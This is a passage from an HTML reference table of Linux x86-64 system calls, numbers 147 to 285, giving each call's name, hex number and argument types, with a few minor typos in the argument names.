align="left">sys_sched_get_priority_min</td><td align="left">0x93</td><td align="left">int policy</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">148</td><td align="left">sys_sched_rr_get_interval</td><td align="left">0x94</td><td align="left">pid_t pid</td><td align="left">struct timespec *interval</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">149</td><td align="left">sys_mlock</td><td align="left">0x95</td><td align="left">unsigned long start</td><td align="left">size_t len</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">150</td><td align="left">sys_munlock</td><td align="left">0x96</td><td align="left">unsigned long start</td><td align="left">size_t len</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">151</td><td align="left">sys_mlockall</td><td align="left">0x97</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">152</td><td align="left">sys_munlockall</td><td align="left">0x98</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">153</td><td align="left">sys_vhangup</td><td align="left">0x99</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">154</td><td align="left">sys_modify_ldt</td><td align="left">0x9A</td><td align="left">int func</td><td align="left">void *ptr</td><td align="left">unsigned long bytecount</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">155</td><td align="left">sys_pivot_root</td><td align="left">0x9B</td><td align="left">const char *new_root</td><td align="left">const char *put_old</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">156</td><td align="left">sys__sysctl</td><td align="left">0x9C</td><td align="left">struct __sysctl_args *args</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">157</td><td align="left">sys_prctl</td><td align="left">0x9D</td><td align="left">int option</td><td align="left">unsigned long arg2</td><td align="left">unsigned long arg3</td><td align="left">unsigned long arg4</td><td align="left">unsigned long arg5</td><td align="left"></td></tr><tr><td align="left">158</td><td align="left">sys_arch_prctl</td><td align="left">0x9E</td><td align="left">struct task_struct *task</td><td align="left">int code</td><td align="left">unsigned long *addr</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">159</td><td align="left">sys_adjtimex</td><td align="left">0x9F</td><td align="left">struct timex *txc_p</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">160</td><td align="left">sys_setrlimit</td><td align="left">0xA0</td><td align="left">unsigned int resource</td><td align="left">struct rlimit *rlim</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">161</td><td align="left">sys_chroot</td><td align="left">0xA1</td><td align="left">const char *filename</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">162</td><td align="left">sys_sync</td><td align="left">0xA2</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">163</td><td align="left">sys_acct</td><td align="left">0xA3</td><td align="left">const char *name</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">164</td><td align="left">sys_settimeofday</td><td align="left">0xA4</td><td align="left">struct timeval *tv</td><td align="left">struct timezone *tz</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">165</td><td align="left">sys_mount</td><td align="left">0xA5</td><td align="left">char *dev_name</td><td align="left">char *dir_name</td><td align="left">char *type</td><td align="left">unsigned long flags</td><td align="left">void *data</td><td align="left"></td></tr><tr><td align="left">166</td><td align="left">sys_umount2</td><td align="left">0xA6</td><td align="left">const char *target</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">167</td><td align="left">sys_swapon</td><td align="left">0xA7</td><td align="left">const char *specialfile</td><td align="left">int swap_flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">168</td><td align="left">sys_swapoff</td><td align="left">0xA8</td><td align="left">const char *specialfile</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">169</td><td align="left">sys_reboot</td><td align="left">0xA9</td><td align="left">int magic1</td><td align="left">int magic2</td><td align="left">unsigned int cmd</td><td align="left">void *arg</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">170</td><td align="left">sys_sethostname</td><td align="left">0xAA</td><td align="left">char *name</td><td align="left">int len</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">171</td><td align="left">sys_setdomainname</td><td align="left">0xAB</td><td align="left">char *name</td><td align="left">int len</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">172</td><td align="left">sys_iopl</td><td align="left">0xAC</td><td align="left">unsigned int level</td><td align="left">struct pt_regs *regs</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">173</td><td align="left">sys_ioperm</td><td align="left">0xAD</td><td align="left">unsigned long from</td><td align="left">unsigned long num</td><td align="left">int turn_on</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">174</td><td align="left">sys_create_module</td><td align="left">0xAE</td><td align="left">REMOVED IN Linux 2.6</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">175</td><td align="left">sys_init_module</td><td align="left">0xAF</td><td align="left">void *umod</td><td align="left">unsigned long len</td><td align="left">const char *uargs</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">176</td><td align="left">sys_delete_module</td><td align="left">0xB0</td><td align="left">const chat *name_user</td><td align="left">unsigned int flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">177</td><td align="left">sys_get_kernel_syms</td><td align="left">0xB1</td><td align="left">REMOVED IN Linux 2.6</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">178</td><td align="left">sys_query_module</td><td align="left">0xB2</td><td align="left">REMOVED IN Linux 2.6</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">179</td><td align="left">sys_quotactl</td><td align="left">0xB3</td><td align="left">unsigned int cmd</td><td align="left">const char *special</td><td align="left">qid_t id</td><td align="left">void *addr</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">180</td><td align="left">sys_nfsservctl</td><td align="left">0xB4</td><td align="left">NOT IMPLEMENTED</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">181</td><td align="left">sys_getpmsg</td><td align="left">0xB5</td><td align="left">NOT IMPLEMENTED</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">182</td><td align="left">sys_putpmsg</td><td align="left">0xB6</td><td align="left">NOT IMPLEMENTED</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">183</td><td align="left">sys_afs_syscall</td><td align="left">0xB7</td><td align="left">NOT IMPLEMENTED</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">184</td><td align="left">sys_tuxcall</td><td align="left">0xB8</td><td align="left">NOT IMPLEMENTED</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">185</td><td align="left">sys_security</td><td align="left">0xB9</td><td align="left">NOT IMPLEMENTED</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">186</td><td align="left">sys_gettid</td><td align="left">0xBA</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">187</td><td align="left">sys_readahead</td><td align="left">0xBB</td><td align="left">int fd</td><td align="left">loff_t offset</td><td align="left">size_t count</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">188</td><td align="left">sys_setxattr</td><td align="left">0xBC</td><td align="left">const char *pathname</td><td align="left">const char *name</td><td align="left">const void *value</td><td align="left">size_t size</td><td align="left">int flags</td><td align="left"></td></tr><tr><td align="left">189</td><td align="left">sys_lsetxattr</td><td align="left">0xBD</td><td align="left">const char *pathname</td><td align="left">const char *name</td><td align="left">const void *value</td><td align="left">size_t size</td><td align="left">int flags</td><td align="left"></td></tr><tr><td align="left">190</td><td align="left">sys_fsetxattr</td><td align="left">0xBE</td><td align="left">int fd</td><td align="left">const char *name</td><td align="left">const void *value</td><td align="left">size_t size</td><td align="left">int flags</td><td align="left"></td></tr><tr><td align="left">191</td><td align="left">sys_getxattr</td><td align="left">0xBF</td><td align="left">const char *pathname</td><td align="left">const char *name</td><td align="left">void *value</td><td align="left">size_t size</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">192</td><td align="left">sys_lgetxattr</td><td align="left">0xC0</td><td align="left">const char *pathname</td><td align="left">const char *name</td><td align="left">void *value</td><td align="left">size_t size</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">193</td><td align="left">sys_fgetxattr</td><td align="left">0xC1</td><td align="left">int fd</td><td align="left">const har *name</td><td align="left">void *value</td><td align="left">size_t size</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">194</td><td align="left">sys_listxattr</td><td align="left">0xC2</td><td align="left">const char *pathname</td><td align="left">char *list</td><td align="left">size_t size</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">195</td><td align="left">sys_llistxattr</td><td align="left">0xC3</td><td align="left">const char *pathname</td><td align="left">char *list</td><td align="left">size_t size</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">196</td><td align="left">sys_flistxattr</td><td align="left">0xC4</td><td align="left">int fd</td><td align="left">char *list</td><td align="left">size_t size</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">197</td><td align="left">sys_removexattr</td><td align="left">0xC5</td><td align="left">const char *pathname</td><td align="left">const char *name</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">198</td><td align="left">sys_lremovexattr</td><td align="left">0xC6</td><td align="left">const char *pathname</td><td align="left">const char *name</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">199</td><td align="left">sys_fremovexattr</td><td align="left">0xC7</td><td align="left">int fd</td><td align="left">const char *name</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">200</td><td align="left">sys_tkill</td><td align="left">0xC8</td><td align="left">pid_t pid</td><td align="left">ing sig</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">201</td><td align="left">sys_time</td><td align="left">0xC9</td><td align="left">time_t *tloc</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">202</td><td align="left">sys_futex</td><td align="left">0xCA</td><td align="left">u32 *uaddr</td><td align="left">int op</td><td align="left">u32 val</td><td align="left">struct timespec *utime</td><td align="left">u32 *uaddr2</td><td align="left">u32 val3</td></tr><tr><td align="left">203</td><td align="left">sys_sched_setaffinity</td><td align="left">0xCB</td><td align="left">pid_t pid</td><td align="left">unsigned int len</td><td align="left">unsigned long *user_mask_ptr</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">204</td><td align="left">sys_sched_getaffinity</td><td align="left">0xCC</td><td align="left">pid_t pid</td><td align="left">unsigned int len</td><td align="left">unsigned long *user_mask_ptr</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">205</td><td align="left">sys_set_thread_area</td><td align="left">0xCD</td><td align="left">NOT IMPLEMENTED. Use arch_prctl</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">206</td><td align="left">sys_io_setup</td><td align="left">0xCE</td><td align="left">unsigned nr_events</td><td align="left">aio_context_t *ctxp</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">207</td><td align="left">sys_io_destroy</td><td align="left">0xCF</td><td align="left">aio_context_t ctx</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">208</td><td align="left">sys_io_getevents</td><td align="left">0xD0</td><td align="left">aio_context_t ctx_id</td><td align="left">long min_nr</td><td align="left">long nr</td><td align="left">struct io_event *events</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">209</td><td align="left">sys_io_submit</td><td align="left">0xD1</td><td align="left">aio_context_t ctx_id</td><td align="left">long nr</td><td align="left">struct iocb **iocbpp</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">210</td><td align="left">sys_io_cancel</td><td align="left">0xD2</td><td align="left">aio_context_t ctx_id</td><td align="left">struct iocb *iocb</td><td align="left">struct io_event *result</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">211</td><td align="left">sys_get_thread_area</td><td align="left">0xD3</td><td align="left">NOT IMPLEMENTED. Use arch_prctl</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">212</td><td align="left">sys_lookup_dcookie</td><td align="left">0xD4</td><td align="left">u64 cookie64</td><td align="left">long buf</td><td align="left">long len</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">213</td><td align="left">sys_epoll_create</td><td align="left">0xD5</td><td align="left">int size</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">214</td><td align="left">sys_epoll_ctl_old</td><td align="left">0xD6</td><td align="left">NOT IMPLEMENTED</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">215</td><td align="left">sys_epoll_wait_old</td><td align="left">0xD7</td><td align="left">NOT IMPLEMENTED</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">216</td><td align="left">sys_remap_file_pages</td><td align="left">0xD8</td><td align="left">unsigned long start</td><td align="left">unsigned long size</td><td align="left">unsigned long prot</td><td align="left">unsigned long pgoff</td><td align="left">unsigned long flags</td><td align="left"></td></tr><tr><td align="left">217</td><td align="left">sys_getdents64</td><td align="left">0xD9</td><td align="left">unsigned int fd</td><td align="left">struct linux_dirent64 *dirent</td><td align="left">unsigned int count</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">218</td><td align="left">sys_set_tid_address</td><td align="left">0xDA</td><td align="left">int *tidptr</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">219</td><td align="left">sys_restart_syscall</td><td align="left">0xDB</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">220</td><td align="left">sys_semtimedop</td><td align="left">0xDC</td><td align="left">int semid</td><td align="left">struct sembuf *tsops</td><td align="left">unsigned nsops</td><td align="left">const struct timespec *timeout</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">221</td><td align="left">sys_fadvise64</td><td align="left">0xDD</td><td align="left">int fd</td><td align="left">loff_t offset</td><td align="left">size_t len</td><td align="left">int advice</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">222</td><td align="left">sys_timer_create</td><td align="left">0xDE</td><td align="left">const clockid_t which_clock</td><td align="left">struct sigevent *timer_event_spec</td><td align="left">timer_t *created_timer_id</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">223</td><td align="left">sys_timer_settime</td><td align="left">0xDF</td><td align="left">timer_t timer_id</td><td align="left">int flags</td><td align="left">const struct itimerspec *new_setting</td><td align="left">struct itimerspec *old_setting</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">224</td><td align="left">sys_timer_gettime</td><td align="left">0xE0</td><td align="left">timer_t timer_id</td><td align="left">struct itimerspec *setting</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">225</td><td align="left">sys_timer_getoverrun</td><td align="left">0xE1</td><td align="left">timer_t timer_id</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">226</td><td align="left">sys_timer_delete</td><td align="left">0xE2</td><td align="left">timer_t timer_id</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">227</td><td align="left">sys_clock_settime</td><td align="left">0xE3</td><td align="left">const clockid_t which_clock</td><td align="left">const struct timespec *tp</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">228</td><td align="left">sys_clock_gettime</td><td align="left">0xE4</td><td align="left">const clockid_t which_clock</td><td align="left">struct timespec *tp</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">229</td><td align="left">sys_clock_getres</td><td align="left">0xE5</td><td align="left">const clockid_t which_clock</td><td align="left">struct timespec *tp</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">230</td><td align="left">sys_clock_nanosleep</td><td align="left">0xE6</td><td align="left">const clockid_t which_clock</td><td align="left">int flags</td><td align="left">const struct timespec *rqtp</td><td align="left">struct timespec *rmtp</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">231</td><td align="left">sys_exit_group</td><td align="left">0xE7</td><td align="left">int error_code</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">232</td><td align="left">sys_epoll_wait</td><td align="left">0xE8</td><td align="left">int epfd</td><td align="left">struct epoll_event *events</td><td align="left">int maxevents</td><td align="left">int timeout</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">233</td><td align="left">sys_epoll_ctl</td><td align="left">0xE9</td><td align="left">int epfd</td><td align="left">int op</td><td align="left">int fd</td><td align="left">struct epoll_event *event</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">234</td><td align="left">sys_tgkill</td><td align="left">0xEA</td><td align="left">pid_t tgid</td><td align="left">pid_t pid</td><td align="left">int sig</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">235</td><td align="left">sys_utimes</td><td align="left">0xEB</td><td align="left">char *filename</td><td align="left">struct timeval *utimes</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">236</td><td align="left">sys_vserver</td><td align="left">0xEC</td><td align="left">NOT IMPLEMENTED</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">237</td><td align="left">sys_mbind</td><td align="left">0xED</td><td align="left">unsigned long start</td><td align="left">unsigned long len</td><td align="left">unsigned long mode</td><td align="left">unsigned long *nmask</td><td align="left">unsigned long maxnode</td><td align="left">unsigned flags</td></tr><tr><td align="left">238</td><td align="left">sys_set_mempolicy</td><td align="left">0xEE</td><td align="left">int mode</td><td align="left">unsigned long *nmask</td><td align="left">unsigned long maxnode</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">239</td><td align="left">sys_get_mempolicy</td><td align="left">0xEF</td><td align="left">int *policy</td><td align="left">unsigned long *nmask</td><td align="left">unsigned long maxnode</td><td align="left">unsigned long addr</td><td align="left">unsigned long flags</td><td align="left"></td></tr><tr><td align="left">240</td><td align="left">sys_mq_open</td><td align="left">0xF0</td><td align="left">const char *u_name</td><td align="left">int oflag</td><td align="left">mode_t mode</td><td align="left">struct mq_attr *u_attr</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">241</td><td align="left">sys_mq_unlink</td><td align="left">0xF1</td><td align="left">const char *u_name</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">242</td><td align="left">sys_mq_timedsend</td><td align="left">0xF2</td><td align="left">mqd_t mqdes</td><td align="left">const char *u_msg_ptr</td><td align="left">size_t msg_len</td><td align="left">unsigned int msg_prio</td><td align="left">const stuct timespec *u_abs_timeout</td><td align="left"></td></tr><tr><td align="left">243</td><td align="left">sys_mq_timedreceive</td><td align="left">0xF3</td><td align="left">mqd_t mqdes</td><td align="left">char *u_msg_ptr</td><td align="left">size_t msg_len</td><td align="left">unsigned int *u_msg_prio</td><td align="left">const struct timespec *u_abs_timeout</td><td align="left"></td></tr><tr><td align="left">244</td><td align="left">sys_mq_notify</td><td align="left">0xF4</td><td align="left">mqd_t mqdes</td><td align="left">const struct sigevent *u_notification</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">245</td><td align="left">sys_mq_getsetattr</td><td align="left">0xF5</td><td align="left">mqd_t mqdes</td><td align="left">const struct mq_attr *u_mqstat</td><td align="left">struct mq_attr *u_omqstat</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">246</td><td align="left">sys_kexec_load</td><td align="left">0xF6</td><td align="left">unsigned long entry</td><td align="left">unsigned long nr_segments</td><td align="left">struct kexec_segment *segments</td><td align="left">unsigned long flags</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">247</td><td align="left">sys_waitid</td><td align="left">0xF7</td><td align="left">int which</td><td align="left">pid_t upid</td><td align="left">struct siginfo *infop</td><td align="left">int options</td><td align="left">struct rusage *ru</td><td align="left"></td></tr><tr><td align="left">248</td><td align="left">sys_add_key</td><td align="left">0xF8</td><td align="left">const char *_type</td><td align="left">const char *_description</td><td align="left">const void *_payload</td><td align="left">size_t plen</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">249</td><td align="left">sys_request_key</td><td align="left">0xF9</td><td align="left">const char *_type</td><td align="left">const char *_description</td><td align="left">const char *_callout_info</td><td align="left">key_serial_t destringid</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">250</td><td align="left">sys_keyctl</td><td align="left">0xFA</td><td align="left">int option</td><td align="left">unsigned long arg2</td><td align="left">unsigned long arg3</td><td align="left">unsigned long arg4</td><td align="left">unsigned long arg5</td><td align="left"></td></tr><tr><td align="left">251</td><td align="left">sys_ioprio_set</td><td align="left">0xFB</td><td align="left">int which</td><td align="left">int who</td><td align="left">int ioprio</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">252</td><td align="left">sys_ioprio_get</td><td align="left">0xFC</td><td align="left">int which</td><td align="left">int who</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">253</td><td align="left">sys_inotify_init</td><td align="left">0xFD</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">254</td><td align="left">sys_inotify_add_watch</td><td align="left">0xFE</td><td align="left">int fd</td><td align="left">const char *pathname</td><td align="left">u32 mask</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">255</td><td align="left">sys_inotify_rm_watch</td><td align="left">0xFF</td><td align="left">int fd</td><td align="left">__s32 wd</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">256</td><td align="left">sys_migrate_pages</td><td align="left">0x100</td><td align="left">pid_t pid</td><td align="left">unsigned long maxnode</td><td align="left">const unsigned long *old_nodes</td><td align="left">const unsigned long *new_nodes</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">257</td><td align="left">sys_openat</td><td align="left">0x101</td><td align="left">int dfd</td><td align="left">const char *filename</td><td align="left">int flags</td><td align="left">int mode</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">258</td><td align="left">sys_mkdirat</td><td align="left">0x102</td><td align="left">int dfd</td><td align="left">const char *pathname</td><td align="left">int mode</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">259</td><td align="left">sys_mknodat</td><td align="left">0x103</td><td align="left">int dfd</td><td align="left">const char *filename</td><td align="left">int mode</td><td align="left">unsigned dev</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">260</td><td align="left">sys_fchownat</td><td align="left">0x104</td><td align="left">int dfd</td><td align="left">const char *filename</td><td align="left">uid_t user</td><td align="left">gid_t group</td><td align="left">int flag</td><td align="left"></td></tr><tr><td align="left">261</td><td align="left">sys_futimesat</td><td align="left">0x105</td><td align="left">int dfd</td><td align="left">const char *filename</td><td align="left">struct timeval *utimes</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">262</td><td align="left">sys_newfstatat</td><td align="left">0x106</td><td align="left">int dfd</td><td align="left">const char *filename</td><td align="left">struct stat *statbuf</td><td align="left">int flag</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">263</td><td align="left">sys_unlinkat</td><td align="left">0x107</td><td align="left">int dfd</td><td align="left">const char *pathname</td><td align="left">int flag</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">264</td><td align="left">sys_renameat</td><td align="left">0x108</td><td align="left">int oldfd</td><td align="left">const char *oldname</td><td align="left">int newfd</td><td align="left">const char *newname</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">265</td><td align="left">sys_linkat</td><td align="left">0x109</td><td align="left">int oldfd</td><td align="left">const char *oldname</td><td align="left">int newfd</td><td align="left">const char *newname</td><td align="left">int flags</td><td align="left"></td></tr><tr><td align="left">266</td><td align="left">sys_symlinkat</td><td align="left">0x10A</td><td align="left">const char *oldname</td><td align="left">int newfd</td><td align="left">const char *newname</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">267</td><td align="left">sys_readlinkat</td><td align="left">0x10B</td><td align="left">int dfd</td><td align="left">const char *pathname</td><td align="left">char *buf</td><td align="left">int bufsiz</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">268</td><td align="left">sys_fchmodat</td><td align="left">0x10C</td><td align="left">int dfd</td><td align="left">const char *filename</td><td align="left">mode_t mode</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">269</td><td align="left">sys_faccessat</td><td align="left">0x10D</td><td align="left">int dfd</td><td align="left">const char *filename</td><td align="left">int mode</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">270</td><td align="left">sys_pselect6</td><td align="left">0x10E</td><td align="left">int n</td><td align="left">fd_set *inp</td><td align="left">fd_set *outp</td><td align="left">fd_set *exp</td><td align="left">struct timespec *tsp</td><td align="left">void *sig</td></tr><tr><td align="left">271</td><td align="left">sys_ppoll</td><td align="left">0x10F</td><td align="left">struct pollfd *ufds</td><td align="left">unsigned int nfds</td><td align="left">struct timespec *tsp</td><td align="left">const sigset_t *sigmask</td><td align="left">size_t sigsetsize</td><td align="left"></td></tr><tr><td align="left">272</td><td align="left">sys_unshare</td><td align="left">0x110</td><td align="left">unsigned long unshare_flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">273</td><td align="left">sys_set_robust_list</td><td align="left">0x111</td><td align="left">struct robust_list_head *head</td><td align="left">size_t len</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">274</td><td align="left">sys_get_robust_list</td><td align="left">0x112</td><td align="left">int pid</td><td align="left">struct robust_list_head **head_ptr</td><td align="left">size_t *len_ptr</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">275</td><td align="left">sys_splice</td><td align="left">0x113</td><td align="left">int fd_in</td><td align="left">loff_t *off_in</td><td align="left">int fd_out</td><td align="left">loff_t *off_out</td><td align="left">size_t len</td><td align="left">unsigned int flags</td></tr><tr><td align="left">276</td><td align="left">sys_tee</td><td align="left">0x114</td><td align="left">int fdin</td><td align="left">int fdout</td><td align="left">size_t len</td><td align="left">unsigned int flags</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">277</td><td align="left">sys_sync_file_range</td><td align="left">0x115</td><td align="left">long fd</td><td align="left">loff_t offset</td><td align="left">loff_t bytes</td><td align="left">long flags</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">278</td><td align="left">sys_vmsplice</td><td align="left">0x116</td><td align="left">int fd</td><td align="left">const struct iovec *iov</td><td align="left">unsigned long nr_segs</td><td align="left">unsigned int flags</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">279</td><td align="left">sys_move_pages</td><td align="left">0x117</td><td align="left">pid_t pid</td><td align="left">unsigned long nr_pages</td><td align="left">const void **pages</td><td align="left">const int *nodes</td><td align="left">int *status</td><td align="left">int flags</td></tr><tr><td align="left">280</td><td align="left">sys_utimensat</td><td align="left">0x118</td><td align="left">int dfd</td><td align="left">const char *filename</td><td align="left">struct timespec *utimes</td><td align="left">int flags</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">281</td><td align="left">sys_epoll_pwait</td><td align="left">0x119</td><td align="left">int epfd</td><td align="left">struct epoll_event *events</td><td align="left">int maxevents</td><td align="left">int timeout</td><td align="left">const sigset_t *sigmask</td><td align="left">size_t sigsetsize</td></tr><tr><td align="left">282</td><td align="left">sys_signalfd</td><td align="left">0x11A</td><td align="left">int ufd</td><td align="left">sigset_t *user_mask</td><td align="left">size_t sizemask</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">283</td><td align="left">sys_timerfd_create</td><td align="left">0x11B</td><td align="left">int clockid</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">284</td><td align="left">sys_eventfd</td><td align="left">0x11C</td><td align="left">unsigned int count</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">285</td><td align="left">sys_fallocate</td><td align="left">0x11D</td><td align="left">long fd</td><td align="left">long mode</td><td 